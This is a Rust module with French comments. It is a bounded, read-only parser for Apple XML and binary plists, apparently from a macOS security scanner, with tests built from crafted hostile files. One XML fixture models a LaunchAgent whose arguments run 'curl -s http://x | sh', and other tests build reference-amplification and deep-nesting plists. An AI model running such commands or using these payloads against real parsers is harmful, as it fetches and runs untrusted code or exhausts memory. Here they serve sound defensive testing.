//! Lecture des fichiers plist d'Apple, XML et binaires (« bplist00 »), à la place de `defaults read` et de `plutil` :
//! un programme de moins à lancer par lecture. Lecture seule. Un .plist peut venir d'un logiciel malveillant (un agent
//! posé dans LaunchAgents) : la taille, l'imbrication et le nombre de valeurs sont bornés, et une référence qui boucle
//! ou sort du fichier le rend illisible (`None`) au lieu de faire tomber Vanguard.

use std::io::Read;
use std::path::Path;

/// Au-delà, ce n'est pas un fichier de réglages.
const TAILLE_MAX: u64 = 8 * 1024 * 1024;
/// Octets copiés hors du fichier en tout (textes et données) : un plist binaire peut citer le même objet des milliers
/// de fois par référence, et chaque citation en refait une copie ; sans ce budget, 62 Ko piégés en demandaient 120 Mo.
const COPIES_MAX: usize = 16 * 1024 * 1024;
/// Imbrication des tableaux et des dictionnaires ; une boucle de références binaires bute dessus.
const PROFONDEUR_MAX: usize = 64;
/// Valeurs lues en tout : un plist binaire peut citer mille fois le même grand tableau.
const VALEURS_MAX: usize = 200_000;
/// Écart entre l'origine des dates d'Apple (1er janvier 2001, UTC) et celle d'Unix, en secondes.
const ORIGINE_APPLE: i64 = 978_307_200;

#[derive(Debug, Clone, PartialEq)]
pub enum Valeur {
    Booleen(bool),
    Entier(i128),
    Reel(f64),
    /// Secondes depuis le 1er janvier 2001 (UTC).
    Date(f64),
    Donnees(Vec<u8>),
    Texte(String),
    Tableau(Vec<Valeur>),
    /// Dans l'ordre du fichier.
    Dico(Vec<(String, Valeur)>),
}

impl Valeur {
    /// La valeur d'une clé d'un dictionnaire ; la dernière l'emporte si la clé est répétée, comme chez Apple.
    pub fn cle(&self, nom: &str) -> Option<&Valeur> {
        match self {
            Valeur::Dico(paires) => paires.iter().rev().find(|(k, _)| k == nom).map(|(_, v)| v),
            _ => None,
        }
    }

    pub fn texte(&self) -> Option<&str> {
        match self {
            Valeur::Texte(t) => Some(t),
            _ => None,
        }
    }

    pub fn tableau(&self) -> Option<&[Valeur]> {
        match self {
            Valeur::Tableau(t) => Some(t),
            _ => None,
        }
    }

    /// Une valeur simple écrite comme `defaults read` l'affiche : un booléen en 1 ou 0, un nombre, un texte. `None`
    /// pour un tableau, un dictionnaire, une date ou des données.
    pub fn comme_defaults(&self) -> Option<String> {
        match self {
            Valeur::Booleen(b) => Some(if *b { "1" } else { "0" }.into()),
            Valeur::Entier(n) => Some(n.to_string()),
            Valeur::Reel(r) => Some(r.to_string()),
            Valeur::Texte(t) => Some(t.clone()),
            _ => None,
        }
    }
}

/// Ce que donne une lecture en mémoire, avec la raison d'un refus.
enum Lecture {
    Lue(Valeur),
    /// Refusé pour ses bornes (trop de valeurs, trop profond, références qui bouclent ou qui multiplient les copies),
    /// ou plist binaire abîmé ou d'un type inconnu. Pour le binaire, les deux sont confondus à dessein : un fichier
    /// qui place un type inconnu avant l'amplification passerait pour « format inconnu » et irait chez `plutil`, qui
    /// développerait les références sans limite. Le texte du bilan dit donc « illisible ou fabriqué ». Un XML qui
    /// dépasse les bornes l'est aussi : `plutil` le rendrait tel quel, et le même lecteur le refuserait encore.
    Hostile,
    /// XML mal formé ou format inconnu : `plutil` peut encore essayer.
    Inconnue,
}

fn lecture(octets: &[u8]) -> Lecture {
    if octets.starts_with(b"bplist00") {
        return binaire::lire(octets).map_or(Lecture::Hostile, Lecture::Lue);
    }
    let Ok(texte) = std::str::from_utf8(octets) else {
        return Lecture::Inconnue;
    };
    let mut hors_bornes = false;
    match xml::lire(texte.strip_prefix('\u{feff}').unwrap_or(texte), &mut hors_bornes) {
        Some(v) => Lecture::Lue(v),
        None if hors_bornes => Lecture::Hostile,
        None => Lecture::Inconnue,
    }
}

/// Un plist en mémoire, binaire ou XML. `None` : format inconnu, fichier abîmé ou hors des bornes.
pub fn lire(octets: &[u8]) -> Option<Valeur> {
    match lecture(octets) {
        Lecture::Lue(v) => Some(v),
        Lecture::Hostile | Lecture::Inconnue => None,
    }
}

/// Ce qu'un fichier plist a donné. Tout vient d'une seule lecture bornée : le fichier n'est jamais rouvert pour en
/// savoir plus (un fichier creux de 100 Go, ou un tube nommé posé à sa place entre deux ouvertures, ferait tomber ou
/// bloquer Vanguard).
#[derive(Debug, PartialEq)]
pub enum Lu {
    Plist(Valeur),
    /// Plus de 8 Mo : aucun fichier de réglages ne fait cette taille ; fabriqué pour gêner l'analyse.
    TropGros,
    /// Refusé par les bornes (XML ou binaire : trop de valeurs, trop profond, références qui bouclent ou qui
    /// multiplient les copies), fabriqué pour gêner l'analyse, ou binaire abîmé (voir `Lecture::Hostile`). À ne
    /// jamais confier à `plutil`, qui développerait les références sans limite.
    Hostile,
    /// Format inconnu ou fichier abîmé : `plutil` peut encore essayer en secours.
    Inconnu,
}

impl Lu {
    /// Le plist lu, ou rien. Les lectures de réglages ne se font que sous macOS.
    #[cfg_attr(not(target_os = "macos"), allow(dead_code))]
    pub fn valeur(self) -> Option<Valeur> {
        match self {
            Lu::Plist(v) => Some(v),
            _ => None,
        }
    }
}

/// Le plist d'un fichier. `Err` : fichier absent, interdit, ou qui n'est pas un fichier ordinaire (un tube nommé
/// bloquerait la lecture) ; sinon ce qu'il contient, dit en une seule lecture.
pub fn lire_fichier(chemin: &Path) -> std::io::Result<Lu> {
    let mut options = std::fs::OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    std::os::unix::fs::OpenOptionsExt::custom_flags(&mut options, libc::O_NONBLOCK);
    let fichier = options.open(chemin)?;
    if !fichier.metadata()?.is_file() {
        return Err(std::io::Error::other("pas un fichier ordinaire"));
    }
    let mut octets = Vec::new();
    fichier.take(TAILLE_MAX + 1).read_to_end(&mut octets)?;
    if octets.len() as u64 > TAILLE_MAX {
        return Ok(Lu::TropGros);
    }
    // Une seule passe : un fichier piégé n'est pas relu une seconde fois pour savoir pourquoi il a été refusé.
    Ok(match lecture(&octets) {
        Lecture::Lue(v) => Lu::Plist(v),
        Lecture::Hostile => Lu::Hostile,
        Lecture::Inconnue => Lu::Inconnu,
    })
}

mod binaire {
    use super::{COPIES_MAX, PROFONDEUR_MAX, VALEURS_MAX, Valeur};

    /// Entier non signé gros-boutiste de 1 à 8 octets.
    fn entier(octets: &[u8]) -> Option<u64> {
        (1..=8)
            .contains(&octets.len())
            .then(|| octets.iter().fold(0, |n, o| (n << 8) | u64::from(*o)))
    }

    struct Lecteur<'a> {
        octets: &'a [u8],
        /// Début de la table des positions : les objets sont entre l'en-tête et elle.
        table: usize,
        taille_position: usize,
        taille_reference: usize,
        nombre: usize,
        lues: usize,
        /// Octets copiés jusqu'ici (textes et données), contre l'amplification par références.
        copies: usize,
    }

    impl<'a> Lecteur<'a> {
        /// `n` octets à partir de `debut`, sans déborder sur la table des positions.
        fn tranche(&self, debut: usize, n: usize) -> Option<&'a [u8]> {
            let fin = debut.checked_add(n)?;
            if fin > self.table {
                return None;
            }
            self.octets.get(debut..fin)
        }

        /// Longueur d'un objet : dans la marque, ou dans l'entier qui la suit quand elle vaut 0xF. Renvoie la
        /// longueur et le début du contenu.
        fn longueur(&self, info: u8, apres: usize) -> Option<(usize, usize)> {
            if info != 0xF {
                return Some((usize::from(info), apres));
            }
            let marque = *self.tranche(apres, 1)?.first()?;
            if marque >> 4 != 0x1 || marque & 0xF > 3 {
                return None;
            }
            let taille = 1usize << (marque & 0xF);
            let n = usize::try_from(entier(self.tranche(apres + 1, taille)?)?).ok()?;
            Some((n, apres + 1 + taille))
        }

        /// Compte `n` octets copiés ; `None` au-delà du budget.
        fn copie(&mut self, n: usize) -> Option<()> {
            self.copies = self.copies.checked_add(n)?;
            (self.copies <= COPIES_MAX).then_some(())
        }

        /// La suite de `n` références qui commence à `debut`, vérifiée entière dans le fichier mais pas copiée : une
        /// liste annoncée de 8 millions de références vers elle-même, recopiée à chaque niveau d'imbrication,
        /// demandait des gigaoctets avant que le compte des valeurs lues ne l'arrête. Chacune est lue au moment de
        /// s'en servir, et chaque objet cité compte dans `lues`.
        fn references(&self, debut: usize, n: usize) -> Option<&'a [u8]> {
            self.tranche(debut, n.checked_mul(self.taille_reference)?)
        }

        /// La `i`-ième référence d'une suite rendue par `references`.
        fn reference(&self, suite: &[u8], i: usize) -> Option<usize> {
            let r = suite.get(i * self.taille_reference..(i + 1) * self.taille_reference)?;
            usize::try_from(entier(r)?).ok()
        }

        fn objet(&mut self, index: usize, profondeur: usize) -> Option<Valeur> {
            self.lues += 1;
            if index >= self.nombre || profondeur > PROFONDEUR_MAX || self.lues > VALEURS_MAX {
                return None;
            }
            // Bornes vérifiées à l'ouverture : la table tient entière dans le fichier.
            let p = self.table + index * self.taille_position;
            let debut = usize::try_from(entier(self.octets.get(p..p + self.taille_position)?)?).ok()?;
            if debut < 8 {
                return None;
            }
            let marque = *self.tranche(debut, 1)?.first()?;
            let (genre, info) = (marque >> 4, marque & 0xF);
            let corps = debut + 1;
            Some(match (genre, info) {
                (0x0, 0x8) => Valeur::Booleen(false),
                (0x0, 0x9) => Valeur::Booleen(true),
                // 1, 2 et 4 octets : non signés ; 8 : signé ; 16 : les grands entiers non signés.
                (0x1, 0..=2) => Valeur::Entier(i128::from(entier(self.tranche(corps, 1 << info)?)?)),
                (0x1, 3) => Valeur::Entier(i128::from(i64::from_be_bytes(self.tranche(corps, 8)?.try_into().ok()?))),
                (0x1, 4) => Valeur::Entier(i128::from_be_bytes(self.tranche(corps, 16)?.try_into().ok()?)),
                (0x2, 2) => Valeur::Reel(f64::from(f32::from_be_bytes(self.tranche(corps, 4)?.try_into().ok()?))),
                (0x2, 3) => Valeur::Reel(f64::from_be_bytes(self.tranche(corps, 8)?.try_into().ok()?)),
                (0x3, 3) => Valeur::Date(f64::from_be_bytes(self.tranche(corps, 8)?.try_into().ok()?)),
                (0x4, _) => {
                    let (n, d) = self.longueur(info, corps)?;
                    self.copie(n)?;
                    Valeur::Donnees(self.tranche(d, n)?.to_vec())
                }
                (0x5, _) => {
                    let (n, d) = self.longueur(info, corps)?;
                    self.copie(n)?;
                    let octets = self.tranche(d, n)?;
                    if !octets.is_ascii() {
                        return None;
                    }
                    Valeur::Texte(String::from_utf8(octets.to_vec()).ok()?)
                }
                (0x6, _) => {
                    let (n, d) = self.longueur(info, corps)?;
                    self.copie(n.checked_mul(2)?)?;
                    let octets = self.tranche(d, n.checked_mul(2)?)?;
                    let unites: Vec<u16> = octets
                        .as_chunks::<2>()
                        .0
                        .iter()
                        .map(|u| u16::from_be_bytes(*u))
                        .collect();
                    Valeur::Texte(String::from_utf16(&unites).ok()?)
                }
                // Identifiant d'objet des archives de Cocoa : un simple nombre ici.
                (0x8, 0..=7) => Valeur::Entier(i128::from(entier(self.tranche(corps, usize::from(info) + 1)?)?)),
                // Tableau ou ensemble.
                (0xA | 0xC, _) => {
                    let (n, d) = self.longueur(info, corps)?;
                    let suite = self.references(d, n)?;
                    let mut valeurs = Vec::new();
                    for i in 0..n {
                        let r = self.reference(suite, i)?;
                        valeurs.push(self.objet(r, profondeur + 1)?);
                    }
                    Valeur::Tableau(valeurs)
                }
                (0xD, _) => {
                    let (n, d) = self.longueur(info, corps)?;
                    let cles = self.references(d, n)?;
                    let valeurs = self.references(d.checked_add(cles.len())?, n)?;
                    let mut paires = Vec::new();
                    for i in 0..n {
                        let Valeur::Texte(cle) = self.objet(self.reference(cles, i)?, profondeur + 1)? else {
                            return None;
                        };
                        paires.push((cle, self.objet(self.reference(valeurs, i)?, profondeur + 1)?));
                    }
                    Valeur::Dico(paires)
                }
                _ => return None,
            })
        }
    }

    /// Format : en-tête « bplist00 », les objets, la table de leurs positions, et 32 octets de fin qui disent la
    /// taille des positions et des références, le nombre d'objets, la racine et où commence la table.
    pub(super) fn lire(octets: &[u8]) -> Option<Valeur> {
        let fin = octets.len().checked_sub(32)?;
        let queue = octets.last_chunk::<32>()?;
        let taille_position = usize::from(queue[6]);
        let taille_reference = usize::from(queue[7]);
        let nombre = usize::try_from(entier(&queue[8..16])?).ok()?;
        let racine = usize::try_from(entier(&queue[16..24])?).ok()?;
        let table = usize::try_from(entier(&queue[24..32])?).ok()?;
        let fin_table = nombre.checked_mul(taille_position)?.checked_add(table)?;
        if !(1..=8).contains(&taille_position)
            || !(1..=8).contains(&taille_reference)
            || racine >= nombre
            || table < 8
            || fin_table > fin
        {
            return None;
        }
        Lecteur {
            octets,
            table,
            taille_position,
            taille_reference,
            nombre,
            lues: 0,
            copies: 0,
        }
        .objet(racine, 0)
    }
}

mod xml {
    use quick_xml::events::Event;

    use super::{ORIGINE_APPLE, PROFONDEUR_MAX, VALEURS_MAX, Valeur};

    /// Un tableau ou un dictionnaire en cours de lecture (avec, pour le dictionnaire, la clé qui attend sa valeur).
    enum Ouvert {
        Tableau(Vec<Valeur>),
        Dico(Vec<(String, Valeur)>, Option<String>),
    }

    /// Range une valeur finie dans ce qui est ouvert, ou en fait la racine.
    fn ranger(pile: &mut [Ouvert], racine: &mut Option<Valeur>, valeur: Valeur) -> Option<()> {
        match pile.last_mut() {
            None if racine.is_none() => *racine = Some(valeur),
            Some(Ouvert::Tableau(t)) => t.push(valeur),
            Some(Ouvert::Dico(paires, cle @ Some(_))) => paires.push((cle.take()?, valeur)),
            _ => return None,
        }
        Some(())
    }

    /// Décodage base64 des <data>, blancs ignorés.
    fn base64(texte: &str) -> Option<Vec<u8>> {
        let mut octets = Vec::new();
        let (mut tampon, mut bits) = (0u32, 0);
        for c in texte.bytes().filter(|c| !c.is_ascii_whitespace()) {
            let v = match c {
                b'A'..=b'Z' => c - b'A',
                b'a'..=b'z' => c - b'a' + 26,
                b'0'..=b'9' => c - b'0' + 52,
                b'+' => 62,
                b'/' => 63,
                b'=' => break,
                _ => return None,
            };
            tampon = (tampon << 6) | u32::from(v);
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                octets.push(u8::try_from((tampon >> bits) & 0xFF).ok()?);
            }
        }
        Some(octets)
    }

    /// Une valeur simple à partir du nom de son élément et de son texte.
    fn simple(nom: &str, texte: &str) -> Option<Valeur> {
        Some(match nom {
            "string" => Valeur::Texte(texte.to_string()),
            "integer" => Valeur::Entier(texte.trim().parse().ok()?),
            "real" => Valeur::Reel(texte.trim().parse().ok()?),
            "true" if texte.trim().is_empty() => Valeur::Booleen(true),
            "false" if texte.trim().is_empty() => Valeur::Booleen(false),
            "data" => Valeur::Donnees(base64(texte)?),
            "date" => {
                let d = chrono::NaiveDateTime::parse_from_str(texte.trim(), "%Y-%m-%dT%H:%M:%SZ").ok()?;
                #[allow(clippy::cast_precision_loss)] // des secondes : exactes bien au-delà de l'an 100 000
                Valeur::Date((d.and_utc().timestamp() - ORIGINE_APPLE) as f64)
            }
            _ => return None,
        })
    }

    /// `hors_bornes` passe à vrai quand le refus vient des bornes (trop de valeurs, trop profond) et non d'un fichier
    /// mal formé : l'appelant le dit hostile au lieu de le confier à `plutil`, qui le rendrait identique.
    pub(super) fn lire(texte: &str, hors_bornes: &mut bool) -> Option<Valeur> {
        let mut lecteur = quick_xml::Reader::from_str(texte);
        let mut pile: Vec<Ouvert> = Vec::new();
        let mut racine = None;
        let mut dans_plist = false;
        // L'élément simple en cours (<key>, <string>…) et son texte.
        let mut courant: Option<(String, String)> = None;
        let mut lues = 0;
        loop {
            let evenement = lecteur.read_event().ok()?;
            if matches!(evenement, Event::Start(_) | Event::Empty(_)) {
                lues += 1;
                if lues > VALEURS_MAX || pile.len() >= PROFONDEUR_MAX {
                    *hors_bornes = true;
                    return None;
                }
                if courant.is_some() {
                    return None;
                }
            }
            match evenement {
                Event::Start(e) | Event::Empty(e) if e.local_name().as_ref() == "plist" => {
                    if dans_plist || !pile.is_empty() || racine.is_some() {
                        return None;
                    }
                    dans_plist = true;
                }
                Event::Start(e) => match e.local_name().as_ref() {
                    "array" => pile.push(Ouvert::Tableau(Vec::new())),
                    "dict" => pile.push(Ouvert::Dico(Vec::new(), None)),
                    nom => courant = Some((nom.to_string(), String::new())),
                },
                Event::Empty(e) => {
                    let valeur = match e.local_name().as_ref() {
                        "array" => Valeur::Tableau(Vec::new()),
                        "dict" => Valeur::Dico(Vec::new()),
                        "key" => match pile.last_mut() {
                            Some(Ouvert::Dico(_, cle @ None)) => {
                                *cle = Some(String::new());
                                continue;
                            }
                            _ => return None,
                        },
                        nom => simple(nom, "")?,
                    };
                    ranger(&mut pile, &mut racine, valeur)?;
                }
                Event::Text(t) => match &mut courant {
                    Some((_, v)) => v.push_str(&t.xml10_content()),
                    None if t.xml10_content().trim().is_empty() => {}
                    None => return None,
                },
                Event::CData(t) => courant.as_mut()?.1.push_str(&t.into_inner()),
                Event::GeneralRef(r) => {
                    let c = match r.as_ref() {
                        "amp" => '&',
                        "lt" => '<',
                        "gt" => '>',
                        "quot" => '"',
                        "apos" => '\'',
                        _ => r.resolve_char_ref().ok().flatten()?,
                    };
                    courant.as_mut()?.1.push(c);
                }
                Event::End(e) => {
                    let nom = e.local_name();
                    if let Some((ouvert, texte)) = courant.take() {
                        if ouvert != nom.as_ref() {
                            return None;
                        }
                        if ouvert == "key" {
                            match pile.last_mut() {
                                Some(Ouvert::Dico(_, cle @ None)) => *cle = Some(texte),
                                _ => return None,
                            }
                        } else {
                            ranger(&mut pile, &mut racine, simple(&ouvert, &texte)?)?;
                        }
                        continue;
                    }
                    let valeur = match (nom.as_ref(), pile.pop()) {
                        ("plist", None) if dans_plist => continue,
                        ("array", Some(Ouvert::Tableau(t))) => Valeur::Tableau(t),
                        ("dict", Some(Ouvert::Dico(paires, None))) => Valeur::Dico(paires),
                        _ => return None,
                    };
                    ranger(&mut pile, &mut racine, valeur)?;
                }
                Event::Eof => break,
                // Déclaration, DOCTYPE (jamais suivi : quick-xml n'en développe pas les entités), commentaires.
                _ => {}
            }
        }
        if !pile.is_empty() || courant.is_some() {
            return None;
        }
        racine
    }
}

/// Une date de plist (secondes depuis 2001) en secondes depuis 1970 ; `None` pour une valeur qu'aucune date ne
/// porte (infinie, hors des bornes) : une plist fabriquée ne doit pas faire déborder le calcul.
#[cfg_attr(not(any(target_os = "macos", test)), allow(dead_code))]
pub fn date_unix(secondes: f64) -> Option<i64> {
    if !secondes.is_finite() || secondes.abs() > 1e15 {
        return None;
    }
    #[allow(clippy::cast_possible_truncation)]
    (secondes as i64).checked_add(ORIGINE_APPLE)
}

/// Une plist écrite lisiblement, à la façon de `plutil -p` : une clé par ligne (« "Label" => "com.exemple" »), les
/// tableaux par rang, l'imbrication par l'indentation ; les données par leur taille, les dates en UTC. Pour les
/// traces d'incident, à côté de la sortie de plutil.
#[cfg_attr(not(any(target_os = "macos", test)), allow(dead_code))]
pub fn afficher(v: &Valeur) -> String {
    fn ecrire(v: &Valeur, retrait: usize, t: &mut String) {
        use std::fmt::Write;
        let marge = "  ".repeat(retrait + 1);
        match v {
            Valeur::Booleen(b) => t.push_str(if *b { "1" } else { "0" }),
            Valeur::Entier(n) => {
                let _ = write!(t, "{n}");
            }
            Valeur::Reel(r) => {
                let _ = write!(t, "{r}");
            }
            Valeur::Date(s) => {
                let d = date_unix(*s).and_then(|u| chrono::DateTime::from_timestamp(u, 0));
                let _ = write!(
                    t,
                    "{}",
                    d.map_or_else(|| s.to_string(), |d| d.format("%Y-%m-%d %H:%M:%S +0000").to_string())
                );
            }
            Valeur::Donnees(o) => {
                let _ = write!(t, "{{length = {}}}", o.len());
            }
            Valeur::Texte(s) => {
                let _ = write!(t, "{s:?}");
            }
            Valeur::Tableau(liste) => {
                t.push_str("[\n");
                for (i, e) in liste.iter().enumerate() {
                    let _ = write!(t, "{marge}{i} => ");
                    ecrire(e, retrait + 1, t);
                    t.push('\n');
                }
                t.push_str(&"  ".repeat(retrait));
                t.push(']');
            }
            Valeur::Dico(paires) => {
                t.push_str("{\n");
                for (k, e) in paires {
                    let _ = write!(t, "{marge}{k:?} => ");
                    ecrire(e, retrait + 1, t);
                    t.push('\n');
                }
                t.push_str(&"  ".repeat(retrait));
                t.push('}');
            }
        }
    }
    let mut t = String::new();
    ecrire(v, 0, &mut t);
    t.push('\n');
    t
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dates_hostiles() {
        assert_eq!(date_unix(0.0), Some(ORIGINE_APPLE));
        assert_eq!(date_unix(f64::MAX), None);
        assert_eq!(date_unix(f64::NAN), None);
        assert_eq!(date_unix(-1e300), None);
        let _ = afficher(&Valeur::Date(f64::MAX));
    }

    #[test]
    fn plist_affichee_comme_plutil() {
        let v = Valeur::Dico(vec![
            ("Label".into(), Valeur::Texte("com.exemple.agent".into())),
            (
                "ProgramArguments".into(),
                Valeur::Tableau(vec![Valeur::Texte("/bin/sh".into()), Valeur::Texte("-c".into())]),
            ),
            ("RunAtLoad".into(), Valeur::Booleen(true)),
            ("Donnees".into(), Valeur::Donnees(vec![1, 2, 3])),
            ("Quand".into(), Valeur::Date(0.0)),
        ]);
        assert_eq!(
            afficher(&v),
            "{\n  \"Label\" => \"com.exemple.agent\"\n  \"ProgramArguments\" => [\n    0 => \"/bin/sh\"\n    1 => \"-c\"\n  ]\n  \"RunAtLoad\" => 1\n  \"Donnees\" => {length = 3}\n  \"Quand\" => 2001-01-01 00:00:00 +0000\n}\n"
        );
    }

    const XML: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.exemple.agent &amp; co</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string><![CDATA[curl -s http://x | sh]]></string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>Vide</key>
	<string/>
	<key>Nombre</key>
	<integer>-42</integer>
	<key>Reel</key>
	<real>1.5</real>
	<key>Donnees</key>
	<data>
	AAEC
	/w==
	</data>
	<key>Quand</key>
	<date>2001-01-02T00:00:00Z</date>
	<key>Rien</key>
	<dict/>
</dict>
</plist>
"#;

    #[test]
    fn plist_xml() {
        let v = lire(XML.as_bytes()).unwrap();
        assert_eq!(v.cle("Label").and_then(Valeur::texte), Some("com.exemple.agent & co"));
        let args: Vec<&str> = v
            .cle("ProgramArguments")
            .and_then(Valeur::tableau)
            .unwrap()
            .iter()
            .filter_map(Valeur::texte)
            .collect();
        assert_eq!(args, ["/bin/bash", "-c", "curl -s http://x | sh"]);
        assert_eq!(
            v.cle("RunAtLoad").and_then(Valeur::comme_defaults).as_deref(),
            Some("1")
        );
        assert_eq!(v.cle("Vide").and_then(Valeur::texte), Some(""));
        assert_eq!(v.cle("Nombre").and_then(Valeur::comme_defaults).as_deref(), Some("-42"));
        assert_eq!(v.cle("Reel").and_then(Valeur::comme_defaults).as_deref(), Some("1.5"));
        assert_eq!(v.cle("Donnees"), Some(&Valeur::Donnees(vec![0, 1, 2, 0xFF])));
        assert_eq!(v.cle("Quand"), Some(&Valeur::Date(86_400.0)));
        assert_eq!(v.cle("Rien"), Some(&Valeur::Dico(Vec::new())));
        assert_eq!(v.cle("Absente"), None);
    }

    #[test]
    fn xml_mal_forme_refuse() {
        for mauvais in [
            "<plist><dict><string>sans clé</string></dict></plist>",
            "<plist><dict><key>a</key></dict></plist>",
            "<plist><array><string>a</array></string></plist>",
            "<plist><string>a</string><string>b</string></plist>",
            "<plist><dict><key>a</key><string>&inconnue;</string></dict></plist>",
            "<plist><integer>douze</integer></plist>",
            "<plist><array>",
            "texte libre",
            "",
        ] {
            assert_eq!(lire(mauvais.as_bytes()), None, "{mauvais}");
        }
        let profond = format!("<plist>{}{}</plist>", "<array>".repeat(100), "</array>".repeat(100));
        assert_eq!(lire(profond.as_bytes()), None);
        // Le DOCTYPE peut déclarer des entités : jamais développées.
        let entites = "<!DOCTYPE plist [<!ENTITY a \"aaaaaaaaaa\">]><plist><string>&a;</string></plist>";
        assert_eq!(lire(entites.as_bytes()), None);
    }

    /// Fabrique un plist binaire : les objets déjà encodés (avec leur marque), les positions sur deux octets, les
    /// références sur un.
    fn bplist(objets: &[Vec<u8>], racine: u8) -> Vec<u8> {
        let mut o = b"bplist00".to_vec();
        let mut positions = Vec::new();
        for objet in objets {
            positions.extend(u16::try_from(o.len()).unwrap().to_be_bytes());
            o.extend(objet);
        }
        let table = o.len();
        o.extend(&positions);
        o.extend([0; 6]);
        o.extend([2, 1]);
        o.extend(u64::try_from(objets.len()).unwrap().to_be_bytes());
        o.extend(u64::from(racine).to_be_bytes());
        o.extend(u64::try_from(table).unwrap().to_be_bytes());
        o
    }

    fn ascii(t: &str) -> Vec<u8> {
        let n = u8::try_from(t.len()).unwrap();
        // Quinze caractères et plus : la longueur suit, en entier d'un octet.
        let mut o = if n < 15 { vec![0x50 | n] } else { vec![0x5F, 0x10, n] };
        o.extend(t.as_bytes());
        o
    }

    /// Un tableau de 2 000 références vers une seule donnée de 60 Ko : 62 Ko sur disque, 120 Mo une fois copié
    /// objet par objet. Le budget de copies le refuse, et le dit hostile (jamais confié à plutil).
    #[test]
    fn amplification_par_references_refusee() {
        let donnee = {
            // Données de 60 000 octets : marque 0x4F, longueur sur un entier de 2 octets (0x11), puis le contenu.
            let mut o = vec![0x4F, 0x11];
            o.extend(60_000u16.to_be_bytes());
            o.extend(std::iter::repeat_n(0x42u8, 60_000));
            o
        };
        let tableau = {
            // Tableau de 2 000 éléments (0xAF + longueur sur 2 octets), tous la référence 1 (sur un octet).
            let mut o = vec![0xAF, 0x11];
            o.extend(2000u16.to_be_bytes());
            o.extend(std::iter::repeat_n(1u8, 2000));
            o
        };
        let piege = bplist(&[tableau, donnee], 0);
        assert!(piege.len() < 70_000);
        assert_eq!(lire(&piege), None);
        assert!(matches!(lecture(&piege), Lecture::Hostile));
        // Un plist binaire ordinaire n'est pas hostile ; un XML mal formé non plus (plutil peut essayer).
        assert!(matches!(lecture(&bplist(&[ascii("ok")], 0)), Lecture::Lue(_)));
        assert!(matches!(
            lecture(b"<plist><string>&a;</string></plist>"),
            Lecture::Inconnue
        ));
        // Le même tableau avec 200 références reste sous le budget : lu.
        let petit = {
            let mut o = vec![0xAF, 0x11];
            o.extend(200u16.to_be_bytes());
            o.extend(std::iter::repeat_n(1u8, 200));
            o
        };
        let donnee = {
            let mut o = vec![0x4F, 0x11];
            o.extend(60_000u16.to_be_bytes());
            o.extend(std::iter::repeat_n(0x42u8, 60_000));
            o
        };
        assert!(lire(&bplist(&[petit, donnee], 0)).is_some());
    }

    /// Un tableau de 8 millions de références vers lui-même (8 Mo) : chaque niveau d'imbrication recopiait toute la
    /// liste (64 Mo) avant de compter quoi que ce soit, 4 Go en tout. Refusé sans rien copier.
    #[test]
    fn longue_liste_de_references_jamais_copiee() {
        let n: u64 = 8_000_000;
        let mut o = b"bplist00".to_vec();
        // Objet 0 : tableau (0xAF), longueur sur un entier de 8 octets (0x13), toutes les références vers l'objet 0.
        o.extend([0xAF, 0x13]);
        o.extend(n.to_be_bytes());
        o.extend(std::iter::repeat_n(0u8, usize::try_from(n).unwrap()));
        let table = o.len();
        // Table d'une position sur un octet (l'objet 0 commence à 8), puis la queue.
        o.push(8);
        o.extend([0; 6]);
        o.extend([1, 1]);
        o.extend(1u64.to_be_bytes());
        o.extend(0u64.to_be_bytes());
        o.extend(u64::try_from(table).unwrap().to_be_bytes());
        assert!(o.len() as u64 <= TAILLE_MAX);
        let debut = std::time::Instant::now();
        assert!(matches!(lecture(&o), Lecture::Hostile));
        assert!(debut.elapsed() < std::time::Duration::from_secs(5));
        // Une liste annoncée plus longue que le fichier reste refusée d'emblée.
        let mut tronque = o.clone();
        tronque[10..18].copy_from_slice(&(n * 2).to_be_bytes());
        assert_eq!(lire(&tronque), None);
    }

    /// Un XML valide pour launchd, gonflé d'un tableau de 250 000 <true/> (1,75 Mo) : refusé par les bornes, il est
    /// hostile, jamais « format inconnu » confié à plutil qui le rendrait identique (et l'agent sauté en silence).
    #[test]
    fn xml_hors_bornes_hostile() {
        let gonfle = format!(
            "<plist><dict><key>ProgramArguments</key><array><string>/bin/bash</string></array><key>Padding</key><array>{}</array></dict></plist>",
            "<true/>".repeat(250_000)
        );
        assert!(matches!(lecture(gonfle.as_bytes()), Lecture::Hostile));
        let profond = format!("<plist>{}{}</plist>", "<array>".repeat(100), "</array>".repeat(100));
        assert!(matches!(lecture(profond.as_bytes()), Lecture::Hostile));
        // Mal formé : pas hostile, plutil peut encore le lire.
        assert!(matches!(lecture(b"<plist><array>"), Lecture::Inconnue));
        assert!(matches!(lecture(b"\xff\xfe pas du texte"), Lecture::Inconnue));
    }

    #[test]
    fn plist_binaire() {
        let objets = [
            // 0 : { Program: "/Applications/A.app", GuestEnabled: true, Nombre: 300, Nom: "été", Liste: [1, 2] }
            vec![0xD5, 1, 3, 5, 7, 9, 2, 4, 6, 8, 10],
            ascii("Program"),
            ascii("/Applications/A.app"),
            ascii("GuestEnabled"),
            vec![0x09],
            ascii("Nombre"),
            vec![0x11, 0x01, 0x2C],
            ascii("Nom"),
            vec![0x63, 0, b'\xe9', 0, b't', 0, b'\xe9'],
            ascii("Liste"),
            vec![0xA2, 11, 12],
            vec![0x10, 1],
            vec![0x13, 0, 0, 0, 0, 0, 0, 0, 2],
        ];
        let v = lire(&bplist(&objets, 0)).unwrap();
        assert_eq!(v.cle("Program").and_then(Valeur::texte), Some("/Applications/A.app"));
        assert_eq!(
            v.cle("GuestEnabled").and_then(Valeur::comme_defaults).as_deref(),
            Some("1")
        );
        assert_eq!(v.cle("Nombre"), Some(&Valeur::Entier(300)));
        assert_eq!(v.cle("Nom").and_then(Valeur::texte), Some("été"));
        assert_eq!(
            v.cle("Liste"),
            Some(&Valeur::Tableau(vec![Valeur::Entier(1), Valeur::Entier(2)]))
        );
    }

    /// Un plist binaire écrit par un autre programme (plistlib de Python), pas par ce fichier : grand entier, réel,
